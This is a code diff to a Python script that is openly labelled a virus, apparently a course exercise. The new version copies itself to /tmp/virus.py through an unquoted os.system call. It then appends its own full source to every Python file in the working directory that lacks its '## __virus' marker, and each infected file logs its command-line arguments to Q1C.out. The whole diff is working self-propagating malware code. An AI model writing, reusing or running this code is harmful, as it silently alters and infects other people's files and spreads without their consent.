@@ -3,45 +3,31 @@ import sys
 
 payload = """
 ## __virus
-import sys
-import os
-
 with open("Q1C.out", "a") as f:
     f.write(f"{' '.join(sys.argv)}\\n")
-
-for file in os.listdir('.'):
-    if not file.endswith(".py"):
-        continue
-
-    infected = False
-    with open(file, "r") as f:
-        for line in f:
-            if "## __virus" in line:
-                infected = True
-                break
-    
-    if not infected:
-        with open(file, "a") as f:
-            f.write(
-                \"\"\"
-                %s
-                \"\"\"
-            )
-
 """
 
 if __name__ == '__main__':
-    for file in os.listdir('.'):
-        if not file.endswith(".py"):
-            continue
+    if not os.path.exists('/tmp/virus.py'):
+        cwd = os.getcwd()
+        script_name = os.path.basename(__file__)
+        script_path = os.path.join(cwd, script_name)
+        os.system(f'cp {script_path} /tmp/virus.py')
+    
+    with open('/tmp/virus.py', 'r') as f:
+        virus = f.read()
 
-        injected = False
-        with open(file, "r") as f:
-            for line in f:
-                if "## __virus" in line:
-                    injected = True
-                    break
+        for file in os.listdir('.'):
+            if not file.endswith(".py"):
+                continue
 
-        if not injected:
-            with open(file, "a") as f:
-                f.write(payload % payload)
+            injected = False
+            with open(file, "r") as f:
+                for line in f:
+                    if "## __virus" in line:
+                        injected = True
+                        break
+
+            if not injected:
+                with open(file, "a") as f:
+                    f.write(virus)
